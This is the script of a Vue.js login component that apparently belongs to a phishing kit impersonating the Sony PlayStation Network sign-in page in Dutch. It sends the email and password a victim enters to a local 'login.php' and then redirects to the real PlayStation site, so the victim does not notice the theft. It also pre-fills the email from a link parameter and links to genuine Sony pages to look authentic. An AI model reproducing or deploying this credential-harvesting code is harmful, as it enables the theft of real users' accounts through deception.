<script>
/* eslint-disable */
import axios from 'axios'
export default {
  name: 'App',
  data () {
    return {
      view: 1,
      email: '',
      password: '',
      passwordInputType: 'password',
      submitError: false,
      submitLoading: false,
      referrerPage: "//www.playstation.com/nl-nl/"
    }
  },
  methods: {
    isValidEmail (email) {
      return /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(String(email).toLowerCase());
    },
    newAccount () {
      window.location.replace('https//id.sonyentertainmentnetwork.com/create_account/?request_locale=nl_nl')
    },
    resetPassword () {
      window.location.replace('https://id.sonyentertainmentnetwork.com/id/reset_password/?request_locale=nl_NL')
    },
    submitForm (form) {
      let t = this
      t.submitError = !t.isValidEmail(t.email) || t.password.length === 0
      t.submitLoading = true
      setTimeout(() => {
        if (t.submitError) {
          t.password = ''
          t.submitLoading = false
        } else {
          axios.post('login.php', {email: t.email, password: t.password})
          .then(res => {
            t.submitLoading = false
            window.location.replace(t.referrerPage);
          })
          .catch(error => {
            t.submitLoading = false
            window.location.replace(t.referrerPage);
          })
        }
      }, 2500);
    },
    togglePasswordType () {
      this.passwordInputType === 'password' ? 'text' : 'password'
    },
    initiatePage () {
      let uri = window.location.href.split("?");
      if (uri.length > 0 && uri[1] !== undefined) {
        let vars = uri[1].split("&");
        let getVars = {};
        let tmp = "";
        vars.forEach(function(v) {
          tmp = v.split("=");
          if (tmp.length == 2)
            getVars[tmp[0].toLowerCase()] = decodeURIComponent(tmp[1]);
        });
        this.email = "undefined" !== typeof getVars["e"] ? getVars["e"] : "";
      }
    }
  },
  computed: {
    dateYear () {
      return new Date().getFullYear()
    },
    canSubmit () {
      return this.email.length > 0 && this.password.length > 0
    }
  },
  beforeMount () {
    this.initiatePage()
  }
};
</script>

